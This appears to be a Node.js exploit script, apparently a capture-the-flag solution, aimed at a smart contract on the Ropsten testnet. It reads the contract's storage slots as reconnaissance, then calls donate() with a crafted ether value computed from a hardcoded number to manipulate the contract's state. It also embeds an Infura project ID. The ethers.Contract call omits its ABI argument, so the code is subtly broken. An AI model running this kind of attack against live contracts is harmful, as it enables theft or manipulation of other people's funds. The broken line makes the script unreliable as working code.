const { ethers } = require("ethers");
const contractAddress = "0x5906C586eE6d23A7439e2cd1654EBF0cCb2F692B";
const abi = require("./ABI.json");
require("dotenv").config();

let provider = ethers.providers.getDefaultProvider("ropsten");
provider = new ethers.providers.JsonRpcProvider(
    "https://ropsten.infura.io/v3/27329cef779644bbb38f91c985e66b9e"
);
const privateKey = process.env.PRIVATEKEY;
const wallet = new ethers.Wallet(privateKey, provider);
const contract = new ethers.Contract(contractAddress, )
const contractWithSigner = contract.connect(wallet);

const recon = async() => {
    for (let i = 0; i < 3; i++) {
        const result = await provider.getStorageAt(contractAddress, i);
        console.log(result);
    }
}

const attack = async() => {
    const wei = ethers.BigNumber.from("1000000000000000000000000000000000000");
    const target = ethers.BigNumber.from("797123433203098517757516532051439829866916079281");
    const amount = target.div(wei)
    const override = {
        value: amount
    }
    const tx = await contractWithSigner.donate(wallet.address, override);
    await provider.waitForTransaction(tx.hash);

}

// recon();
attack();
